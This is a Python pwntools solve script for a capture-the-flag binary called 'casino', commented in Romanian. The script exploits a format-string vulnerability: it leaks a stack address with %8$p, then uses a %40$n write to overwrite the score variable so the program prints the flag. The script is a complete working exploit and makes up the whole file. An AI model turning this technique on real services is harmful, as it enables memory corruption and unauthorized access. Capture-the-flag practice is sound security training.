#!/usr/bin/env python3
# ============================================================================
# CTF: casino — format string (write arbitrar cu %n)
# Vulnerabilitate: input non-numeric => give_hint face printf(user). Arg #8 = &buffer
#   => leak cu %8$p; scorul e la buf-0x64. Payload-ul ajunge la arg #40, deci
#   %40$n scrie contorul (200) in &score => score>99 => binarul citeste flag.txt.
# Binar: ELF 32-bit (i386), not stripped | NX on · fara canary · No-PIE · Partial RELRO
#   - No-PIE + Partial RELRO: se poate scrie cu %n intr-o variabila de pe stiva
#     (nu in GOT, dar nici nu e nevoie). NX irelevant (fara shellcode).
# ============================================================================
import sys
from pwn import *

context.binary = elf = ELF('./casino')
context.log_level = 'error'          # scoate zgomotul pwntools

def connect():
    if len(sys.argv) >= 3 and sys.argv[2].isdigit():
        return remote(sys.argv[1], sys.argv[2])
    return process('./casino')

p = connect()

p.recvuntil(b"Introdu un numar ca sa ghicesti, sau scrie o propozitie pentru hint:")

# input non-numeric => give_hint face printf(input) => format string
# arg #8 = &buffer (ebp-0x118); scorul e la ebp-0x17c => buf - 0x64
p.sendline(b"%8$p")
p.recvuntil(b"pentru:\n")
buf = int(p.recvuntil(b"Introdu", drop=True), 16)
score_addr = buf - 0x64
log.success(f"&buffer = {hex(buf)}  ->  &score = {hex(score_addr)}")

# adresa ajunge la arg #40 (inceputul buffer-ului); %40$n scrie contorul = 200
value = 200
payload = p32(score_addr) + b"A" * (value - 4) + b"%40$n"
p.sendline(payload)

# o runda oarecare declanseaza check-ul scor>99 => citeste si afiseaza flag.txt
p.sendline(b"0")

p.recvuntil(b"Player wins")
print(p.recvall(timeout=2).decode(errors="replace"))
